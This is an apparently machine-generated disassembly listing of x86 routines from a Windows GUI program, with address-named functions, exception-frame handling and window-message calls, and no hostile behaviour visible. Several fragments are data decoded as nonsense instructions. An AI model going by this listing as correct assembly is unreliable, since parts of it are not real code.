pop ebx
retn
sub_485df4
mov eax edx
retn
sub_48731e
jmp sub_405fd0
sub_48732c
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_440644
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_485db0
sub_4873d9
jmp sub_405fd0
sub_4873e0
pop ebp
retn
sub_4879aa
push [ eax ]
jl r-xdata
add [ edx ] al
hlt
add [ edx ] al
hlt
sub_4879b2
push [ esi + 0x7c ]
dec eax
add [ edx ] al
hlt
sub_4879ed
dec eax
add [ edx ] al
hlt
sub_488a20
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_488bfd
jmp sub_405fd0
sub_488c04
pop ebx
pop ecx
pop ebp
retn
sub_488c08
cmp [ eax + 0x40 ] 0x0
setne al
retn
sub_488c10
cmp [ eax + 0x40 ] 0x0
jne r-xdata
retn
call sub_488e6c
sub_488cbd
jmp sub_405fd0
sub_488cc4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4055f0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x58 ] edx
sub_488d18
cmp dl [ eax + 0x46 ]
je r-xdata
retn
mov [ eax + 0x46 ] dl
sub_488dc8
test edx edx
je r-xdata
mov eax [ eax + 0x54 ]
mov edx [ eax ]
call [ edx + 0x70 ]
retn
mov eax edx
retn
sub_488f00
jmp sub_405fd0
sub_488f07
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_489022
jmp sub_405fd0
sub_489029
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489046
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub_48903f
jmp sub_405fd0
sub_489046
mov eax [ ebp - 0x4 ]
mov si 0xfff0
call sub_40587c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48911d
jmp sub_405fd0
sub_48915b
jmp sub_405fd0
sub_489162
mov eax [ ebp - 0x4 ]
mov si 0xfff0
call sub_40587c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48938c
jmp sub_405fd0
sub_489393
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4893b0
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
sub_4893a9
jmp sub_405fd0
sub_4893b0
mov eax [ ebp - 0x4 ]
mov si 0xfff0
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4893d9
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
retn
sub_4893d2
jmp sub_405fd0
sub_4893d9
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_48956c
jmp sub_405fd0
sub_489573
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489590
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub_489589
jmp sub_405fd0
sub_489590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4896b0
retn
sub_4895a9
jmp sub_405fd0
sub_4895f8
jmp sub_405fd0
sub_4895ff
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4896a1
jmp sub_405fd0
sub_4896a8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48972a
jmp sub_405fd0
sub_489731
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_489738
or edx 0xffffffff
call sub_4896b0
retn
sub_489c43
jmp sub_405fd0
sub_489c4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489c67
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub_489c60
jmp sub_405fd0
sub_489c67
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489c84
mov eax [ ebp - 0x4 ]
call sub_48acdc
retn
sub_489c7d
jmp sub_405fd0
sub_489c84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_489d61
jmp sub_405fd0
sub_489d68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489d85
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
sub_489d7e
jmp sub_405fd0
sub_489d85
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_489d90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0xffffffff
call sub_489c8c
pop ebx
pop ebp
retn 0x4
sub_489da4
push ebp
mov ebp esp
push ebx
push 0x0
mov ebx [ ebp + 0x8 ]
push ebx
call sub_489c8c
pop ebx
pop ebp
retn 0x4
sub_489ee6
jmp sub_405fd0
sub_489eed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489f0a
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
retn
sub_489f03
jmp sub_405fd0
sub_489f0a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a05f
jmp sub_405fd0
sub_48a0e2
jmp sub_405fd0
sub_48a164
jmp sub_405fd0
sub_48a16b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48a170
push esi
mov esi eax
cmp dl [ esi + 0x44 ]
je r-xdata
pop esi
retn
mov [ esi + 0x44 ] dl
mov eax esi
mov si 0xfff0
call sub_40587c
sub_48a188
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_42e190
pop ebx
retn
sub_48a458
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x50 ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4303e0
sub_48a56f
jmp sub_405fd0
sub_48a576
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
sub_48a58c
jmp sub_405fd0
sub_48a8aa
jmp sub_405fd0
sub_48a8b1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a8ce
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
sub_48a8c7
jmp sub_405fd0
sub_48a8ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a8eb
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
sub_48a8e4
jmp sub_405fd0
sub_48a8eb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a954
jmp sub_405fd0
sub_48aa6b
jmp sub_405fd0
sub_48aa88
jmp sub_405fd0
sub_48ac62
jmp sub_405fd0
sub_48ac69
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48acd8
inc [ eax + 0x60 ]
retn
sub_48acdc
push esi
cmp [ eax + 0x60 ] 0x0
jle r-xdata
cmp [ eax + 0x5c ] 0x0
je r-xdata
dec [ eax + 0x60 ]
pop esi
retn
mov [ eax + 0x5c ] 0x0
mov si 0xfff0
call sub_40587c
sub_48ad30
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_48b0e4
inc [ esi - 0x4f ]
dec eax
add [ edx ] al
hlt
sub_48b0ec
push [ eax - 0x4f ]
dec eax
add [ edx ] al
hlt
sub_48b982
dec eax
add ah bh

sub_48bf8a
inc ebx
add [ eax - 0x31 ] cl
inc ebx
add [ eax + 0x7c0043cf ] ch
iretd
sub_48c06c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x34 ]
xchg edx eax
call sub_430608
retn
sub_48c084
mov al 0x1
retn
sub_48c088
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_43c664
retn
mov eax edx
retn
sub_48c098
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_43c624
retn
mov al 0x1
retn
sub_48c290
mov edx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
call sub_48c3f4
retn
sub_48c29c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_48c408
dec eax
cmp eax [ ebx + 0x4 ]
setg al
test al al
je r-xdata
pop ebx
retn
inc [ ebx + 0x4 ]
sub_48c3f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_4305a0
pop esi
pop ebx
retn
sub_48c408
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x8 ]
retn
sub_48c410
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_48c24c
retn
sub_48c454
cmp edx [ eax + 0x3c ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x34 ]
sub_48c6e8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c6fc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c710
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c724
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c738
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c74c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c760
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c774
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c788
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c79c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_48c7b0
retn
sub_48c7b4
retn
sub_48c7b8
retn
sub_48c7bc
retn
sub_48c7c0
retn
sub_48c7c4
retn
sub_48c7c8
retn
sub_48c7cc
retn
sub_48c7d0
retn
sub_48c7d4
retn
sub_48c7d8
retn
sub_48c7dc
retn
sub_48cb50
jmp sub_405fd0
sub_48cfa4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebx + 0x90 ] eax
sub_48d024
push esi
mov si 0xfff0
call sub_40587c
pop esi
retn
sub_48d0a0
inc [ rw-data ]
retn
sub_48d746
dec eax
add [ edx - 0x27 ] cl
dec eax
add [ esi - 0x27 ] dh
dec eax
add [ edx + eax - 0x6dc00000 ] dl
inc esi
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_490e82
dec ecx
add ah bh

sub_491735
call ebx
pop ss
dec ecx
add [ edx ] al
hlt
sub_491fb1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub_492c11
inc esp
sub eax r-xdata
hlt
sub_492c3a
fisubr [ esi ]
dec ecx
add [ edx ] al
hlt
sub_492cfa
push [ ebx ]
dec ecx
add [ edx ] al
hlt
sub_492d49
push esi
xor eax r-xdata
hlt
sub_49404c
mov eax [ rw-data ]
retn
sub_494054
mov [ rw-data ] eax
retn
sub_49426c
jmp sub_405d1c
sub_4942aa
jmp sub_405fd0
sub_4942b1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4944d4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43ddc0
pop ebp
retn 0x8
sub_4944e8
call sub_43de58
retn
sub_4944f0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43df58
pop ebp
retn 0x8
sub_494504
call sub_43e00c
retn
sub_494650
jmp sub_405fd0
sub_494657
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4946a4
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_494660
retn
xor edx edx
sub_494725
jmp sub_405fd0
sub_49472c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4947c0
movzx eax [ eax + 0x1f ]
xor al 0x1
retn
sub_494b40
xor edx edx
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax edx
retn
mov edx [ eax + 0xc ]
sub_494f08
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_495690
sub_494f24
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_494f08
sub_49503c
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_495690
sub_495054
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_495690
sub_49506c
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_495690
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_495098
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x274 ]
xor al 0x1
retn
sub_4950a8
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_495690
retn
sub_4953c0
push ebx
mov ebx edx
mov edx ebx
call sub_4759a4
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_495430
cmp [ eax + 0x5e ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1ec ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1eb ] 0x0
je r-xdata
sub_495558
jmp sub_405fd0
sub_49555f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_495610
push ebx
mov ebx eax
cmp [ ebx + 0x270 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x278 ]
call sub_49492c
mov eax [ ebx + 0x288 ]
call sub_49492c
sub_495670
push esi
mov esi eax
mov eax [ esi + 0x278 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_495680
push esi
mov esi eax
mov eax [ esi + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_49577b
jmp sub_405fd0
sub_495788
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_49582c
sub_4957a0
inc [ eax + 0x270 ]
retn
sub_495a48
retn
sub_495ab8
jmp sub_405fd0
sub_495b07
jmp sub_405fd0
sub_495b3c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_477b90
retn
mov ecx [ eax + 0x278 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x278 ]
call sub_494bc4
retn
sub_495b60
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_477bb0
retn
mov ecx [ eax + 0x288 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x288 ]
call sub_494bc4
retn
sub_495c65
jmp sub_405fd0
sub_495c6c
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_494818
mov eax [ ebp - 0x4 ]
call sub_495690
sub_495db9
jmp sub_405fd0
sub_495df1
jmp sub_405fd0
sub_495df8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_495e1a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_495e13
jmp sub_405fd0
sub_495e1a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4961c4
jmp sub_405fd0
sub_4961cb
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_405b5c
sub_496221
jmp sub_405d1c
sub_49629d
jmp sub_405d1c
sub_4962a2
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4966f9
jmp sub_405fd0
sub_496700
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_496814
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x2d8 ] eax
pop esi
pop ebx
retn
sub_49682c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4968a0
mov edx eax
mov eax esi
call sub_439310
pop esi
pop ebx
retn
sub_496848
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_49847c
mov edx eax
mov eax esi
call sub_439310
pop esi
pop ebx
retn
sub_4968a0
push ebx
mov ebx eax
mov eax ebx
call sub_497fd8
mov edx r-xdata
call sub_44cf9c
pop ebx
retn
sub_4969b0
push ebx
mov ebx eax
mov eax ebx
call sub_4969c0
xor al 0x1
pop ebx
retn
sub_4969c0
cmp [ eax + 0x274 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x278 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x288 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_496a1c
push ebx
cmp [ eax + 0x2f2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2f4 ]
call [ ebx + 0x2f0 ]
sub_496a3c
push ebx
cmp [ eax + 0x312 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_496a5c
push ebx
cmp [ eax + 0x32a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
sub_496b70
mov edx [ eax + 0x258 ]
test edx edx
je r-xdata
xor eax eax
retn
push 0x4
push edx
call GetWindow
retn
sub_496d73
jmp sub_405fd0
sub_496d7a
pop ecx
pop ebp
retn
sub_496d80
xor eax eax
retn
sub_496e34
jmp sub_405fd0
sub_497232
jmp sub_405fd0
sub_497239
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub_49724f
jmp sub_405fd0
sub_497339
jmp sub_405fd0
sub_497340
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49735d
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub_497356
jmp sub_405fd0
sub_49737d
jmp sub_405fd0
sub_497685
jmp sub_405fd0
sub_497871
jmp sub_405fd0
sub_497928
jmp sub_405fd0
sub_49792f
pop ebx
pop ecx
pop ebp
retn
sub_497fd8
mov eax [ eax + 0x2a4 ]
retn
sub_497fe0
mov eax [ eax + 0x2ac ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_497fec
movzx eax [ eax + 0x60 ]
xor al 0x1
retn
sub_498184
jmp sub_405fd0
sub_49846c
jmp sub_405fd0
sub_498473
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_498514
cmp dl [ eax + 0x29f ]
je r-xdata
retn
mov [ eax + 0x29f ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_4761e4
sub_4985e8
cmp [ eax + 0x2c4 ] 0x0
setne al
retn
sub_498624
push ebx
mov ebx eax
mov eax ebx
call sub_479000
mov eax [ ebx + 0x2a4 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x48 ]
mov edx [ ebx + 0x6c ]
call sub_44cd1c
sub_4986a8
push ebx
mov ebx eax
mov eax ebx
call sub_479028
mov eax [ ebx + 0x2a4 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x64 ]
call sub_44de18
sub_4986c8
push ebx
mov ebx eax
mov eax ebx
call sub_498190
mov edx [ ebx + 0x2b4 ]
mov eax ebx
call sub_498258
pop ebx
retn
sub_499460
jmp sub_405fd0
sub_499467
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49959a
jmp sub_405fd0
sub_499740
jmp sub_405fd0
sub_499747
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_499750
cmp edx [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] edx
test edx edx
je r-xdata
xchg edx eax
call sub_43c22c
sub_499a9d
jmp sub_405fd0
sub_499aa4
mov eax [ rw-data ]
call sub_49d594
mov [ ebp - 0x5 ] 0x1
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_499ac4
retn
sub_499d48
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
sub_499d68
mov eax [ eax + 0x2ac ]
call sub_452f10
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_49fcf8
sub_499f00
jmp sub_405fd0
sub_499f4d
jmp sub_405fd0
sub_499f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499f77
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
call sub_44d038
retn
sub_499f70
jmp sub_405fd0
sub_499f77
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49a158
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_499d68
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_49a514
mov ecx [ eax + 0x2b4 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_460908
sub_49a5ff
jmp sub_405fd0
sub_49a606
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_49a688
call sub_49b6b8
retn
sub_49a690
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x108 ]
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_49aad6
jmp sub_405fd0
sub_49aadd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49ae98
push esi
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
and [ esi + 0x384 ] 0xdf
pop esi
retn
mov eax esi
mov si 0xffae
call sub_40587c
pop esi
retn
sub_49b00c
jmp sub_405d1c
sub_49b46b
jmp sub_405d1c
sub_49b599
jmp sub_405fd0
sub_49b5a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49b5bd
lea eax [ ebp - 0x18 ]
call j_sub_4068a0
retn
sub_49b5b6
jmp sub_405fd0
sub_49b5bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49b5c4
push ebx
mov ebx eax
mov eax [ ebx + 0x2ac ]
call sub_452f10
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_496954
sub_49b5e4
call sub_4055f0
retn
sub_49b63c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_49b6ac
mov edx [ eax ]
call [ edx + 0x100 ]
retn
sub_49b82d
jmp sub_405d1c
sub_49b93d
jmp sub_405fd0
j_sub_405d1c#9
jmp sub_405d1c
sub_49b953
mov eax [ ebp - 0x4 ]
call sub_4055f0
call sub_406120
call sub_406174
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49bb26
jmp sub_405fd0
sub_49bb2d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bb4d
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x1c ]
call sub_404220
retn
sub_49bb46
jmp sub_405fd0
sub_49bb4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bb77
mov eax [ ebp - 0x4 ]
call sub_497fd8
call sub_44d038
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
sub_49bb70
jmp sub_405fd0
sub_49bb77
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bb96
call sub_4571e4
call sub_45659c
retn
sub_49bb8f
jmp sub_405fd0
sub_49bb96
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49bba0
xor edx edx
call sub_496cd0
retn
sub_49bba8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_496cd0
mov eax ebx
call sub_4710cc
pop ebx
retn
sub_49bc3f
jmp sub_405fd0
sub_49bc46
pop ebx
pop ecx
pop ebp
retn
sub_49bc7c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_479ce0
push eax
call PostMessageW
pop ebx
retn
sub_49bec4
jmp sub_405fd0
sub_49bf83
jmp sub_405fd0
sub_49bf8d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bfac
mov eax [ rw-data ]
call sub_49f010
retn
sub_49bfa5
jmp sub_405fd0
sub_49bfac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49bfc9
lea eax [ ebp - 0x20 ]
call j_sub_4068a0
retn
sub_49bfc2
jmp sub_405fd0
sub_49bfc9
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_49c118
cmp [ eax + 0x34 ] 0x0
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_49e24c
retn
retn
call sub_478094
sub_49c4e0
mov edx eax
mov eax [ rw-data ]
call sub_4a0994
mov al 0x1
retn
sub_49c5cc
cmp dl [ eax + 0x340 ]
je r-xdata
retn
mov [ eax + 0x340 ] dl
call sub_49c4f0
sub_49c5e0
cmp dl [ eax + 0x341 ]
je r-xdata
retn
mov [ eax + 0x341 ] dl
call sub_49c4f0
sub_49c5f4
cmp edx [ eax + 0x36c ]
je r-xdata
retn
mov [ eax + 0x36c ] edx
call sub_49c4f0
sub_49c644
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x340 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x368 ] 0x0
je r-xdata
sub_49c7d8
mov eax [ eax + 0x374 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_49ca80
cmp [ eax + 0x29e ] 0x2
jne r-xdata
retn
cmp [ eax + 0x37c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x227
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
sub_49caa8
cmp [ eax + 0x29e ] 0x2
jne r-xdata
retn
cmp [ eax + 0x37c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x228
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
sub_49cad0
cmp [ eax + 0x29e ] 0x2
jne r-xdata
retn
cmp [ eax + 0x37c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x224
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
sub_49caf8
cmp [ eax + 0x29e ] 0x2
jne r-xdata
retn
cmp [ eax + 0x37c ] 0x0
je r-xdata
push 0x1
push 0x0
push 0x224
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
sub_49cce2
jmp sub_405fd0
sub_49cce9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49cd27
call sub_49bc7c
pop ebx
retn
sub_49d00b
jmp sub_405fd0
sub_49d012
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49d090
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49d0f8
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_49d0a8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49d0f8
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_49d0c4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49d0f8
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_49d0dc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49d0f8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_49d158
add esp 0xffffffd8
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
